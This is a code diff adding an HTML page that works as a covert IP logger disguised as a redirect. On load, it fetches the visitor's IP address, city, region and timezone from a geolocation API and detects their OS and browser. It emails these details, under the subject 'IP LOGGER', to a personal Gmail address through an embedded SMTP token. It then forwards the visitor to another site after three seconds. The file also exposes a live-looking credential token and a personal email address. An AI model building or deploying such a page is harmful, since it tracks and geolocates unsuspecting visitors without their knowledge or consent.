@@ -1,0 +1,194 @@
+<html>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script>
+    var IP;
+    $.getJSON('https://ipapi.co/json/', function(data) {
+      IP = data.ip;
+      state = data.region;
+      city = data.city;
+      timezone = data.timezone;
+      console.log(data);
+      console.log(IP);
+
+      var nAgt = navigator.userAgent;
+
+      var os;
+      var clientStrings = [{
+          s: 'Windows 10',
+          r: /(Windows 10.0|Windows NT 10.0)/
+        },
+        {
+          s: 'Windows 8.1',
+          r: /(Windows 8.1|Windows NT 6.3)/
+        },
+        {
+          s: 'Windows 8',
+          r: /(Windows 8|Windows NT 6.2)/
+        },
+        {
+          s: 'Windows 7',
+          r: /(Windows 7|Windows NT 6.1)/
+        },
+        {
+          s: 'Windows Vista',
+          r: /Windows NT 6.0/
+        },
+        {
+          s: 'Windows Server 2003',
+          r: /Windows NT 5.2/
+        },
+        {
+          s: 'Windows XP',
+          r: /(Windows NT 5.1|Windows XP)/
+        },
+        {
+          s: 'Windows 2000',
+          r: /(Windows NT 5.0|Windows 2000)/
+        },
+        {
+          s: 'Windows ME',
+          r: /(Win 9x 4.90|Windows ME)/
+        },
+        {
+          s: 'Windows 98',
+          r: /(Windows 98|Win98)/
+        },
+        {
+          s: 'Windows 95',
+          r: /(Windows 95|Win95|Windows_95)/
+        },
+        {
+          s: 'Windows NT 4.0',
+          r: /(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/
+        },
+        {
+          s: 'Windows CE',
+          r: /Windows CE/
+        },
+        {
+          s: 'Windows 3.11',
+          r: /Win16/
+        },
+        {
+          s: 'Android',
+          r: /Android/
+        },
+        {
+          s: 'Open BSD',
+          r: /OpenBSD/
+        },
+        {
+          s: 'Sun OS',
+          r: /SunOS/
+        },
+        {
+          s: 'Chrome OS',
+          r: /CrOS/
+        },
+        {
+          s: 'Linux',
+          r: /(Linux|X11(?!.*CrOS))/
+        },
+        {
+          s: 'iOS',
+          r: /(iPhone|iPad|iPod)/
+        },
+        {
+          s: 'Mac OS X',
+          r: /Mac OS X/
+        },
+        {
+          s: 'Mac OS',
+          r: /(Mac OS|MacPPC|MacIntel|Mac_PowerPC|Macintosh)/
+        },
+        {
+          s: 'QNX',
+          r: /QNX/
+        },
+        {
+          s: 'UNIX',
+          r: /UNIX/
+        },
+        {
+          s: 'BeOS',
+          r: /BeOS/
+        },
+        {
+          s: 'OS/2',
+          r: /OS\/2/
+        },
+        {
+          s: 'Search Bot',
+          r: /(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/
+        }
+      ];
+      for (var id in clientStrings) {
+        var cs = clientStrings[id];
+        if (cs.r.test(nAgt)) {
+          os = cs.s;
+          break;
+        }
+      }
+
+      let userAgent = navigator.userAgent;
+      let browserName;
+      if (userAgent.match(/chrome|chromium|crios/i)) {
+        browserName = "chrome";
+      } else if (userAgent.match(/firefox|fxios/i)) {
+        browserName = "firefox";
+      } else if (userAgent.match(/safari/i)) {
+        browserName = "safari";
+      } else if (userAgent.match(/opr\//i)) {
+        browserName = "opera";
+      } else if (userAgent.match(/edg/i)) {
+        browserName = "edge";
+      } else {
+        browserName = "No browser detection";
+      }
+
+
+      var today = new Date();
+      var date = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate();
+      var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
+      var dateTime = date + ' ' + time;
+
+function sendEmail(){
+            Email.send({
+              SecureToken: "5276df5b-4b15-4836-8cb5-aacf7d5f409f",
+              To: "aidanwong31@gmail.com",
+              From: "notaidan@notaidan.dev",
+              Subject: "IP LOGGER",
+              Body: `Hello Aidan,
+<br/><br/>
+Here is the IP's information:
+<br/><br/>
+IP Address: ${IP}
+<br/>
+City: ${city}
+<br/>
+State: ${state}
+<br/>
+OS: ${os}
+<br/>
+Browser: ${browserName}
+<br/>
+Timezone: ${timezone}
+<br/>
+User Time: ${dateTime}`,
+            });
+}
+sendEmail();
+});
+
+
+  </script>
+  <script>
+    var delayInMilliseconds = 3000; //1 second
+
+    setTimeout(function() {
+      location.replace("https://notaidan.dev")
+    }, delayInMilliseconds);
+
+  </script>
+</html>
